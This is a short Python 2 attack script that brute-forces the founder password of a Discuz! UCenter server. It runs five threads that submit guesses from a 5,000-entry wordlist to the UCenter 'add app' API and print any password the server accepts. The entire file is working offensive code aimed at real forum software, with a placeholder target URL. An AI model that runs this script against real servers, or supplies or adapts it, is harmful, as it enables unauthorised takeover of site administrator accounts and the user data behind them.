#coding:utf-8
import requests
import sys

from threading import Thread
from Queue import Queue


NUM=5

dicpath='top5000.txt'

apptype='DISCUZX'
appname='Discuz!'
appurl='localhost'
ucclientrelease='20110501'


ucapi='http://target/uc_server'  # no '/' in the end!!

def testucserver():
	try:
		r=requests.get(ucapi+'/index.php?m=app&a=ucinfo&release='+ucclientrelease)
		if 'UC_STATUS_OK' in r.text:
			return True
	except Exception as e:
		print e
		pass
	return False

def brute():
	while True:
		founderpw=q.get()
		data={'m':'app','a':'add','ucfounder':'','ucfounderpw':founderpw,'apptype':apptype,'appname':appname,'appurl':appurl,'appip':'','appcharset':'gbk','appdbcharset':'gbk','release':ucclientrelease}
		posturl=ucapi+'/index.php'
		r = requests.post(posturl,data)
		while r.status_code!=200:
			r = requests.post(posturl,data)
		rt=r.text
		#print rt
		if rt!='-1' and rt!='':
			print 'Founder Password found! : '+founderpw
			print rt
			break
			sys.exit()
		q.task_done()
	


if __name__ == '__main__':
	if testucserver()==False:
		print 'UCAPI error'
		sys.exit()
	q=Queue()
	for i in range(NUM):
		t = Thread(target=brute)
		t.daemon=True
		t.start()
	print 'Threads started'
	with open(dicpath) as f:
		for line in f:
			pw = line.strip()
			q.put(pw)
	f.close()
	q.join()








